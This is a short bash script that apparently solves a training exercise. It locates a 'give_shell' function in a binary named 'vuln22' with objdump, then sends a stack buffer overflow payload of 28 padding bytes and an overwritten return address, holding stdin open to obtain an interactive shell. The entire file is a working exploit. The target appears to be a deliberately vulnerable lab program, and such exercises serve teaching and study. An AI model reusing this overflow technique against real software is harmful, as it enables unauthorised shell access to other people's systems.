#!/bin/bash

echo "objdump -d vuln22 | grep give_shell"
objdump -d vuln22 | grep give_shell
echo "(python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080484e6)'; cat -) | ./vuln22"
(python2 -c 'import struct; print "A" * 28 + struct.pack("I", 0x080484e6)'; cat -) | ./vuln22
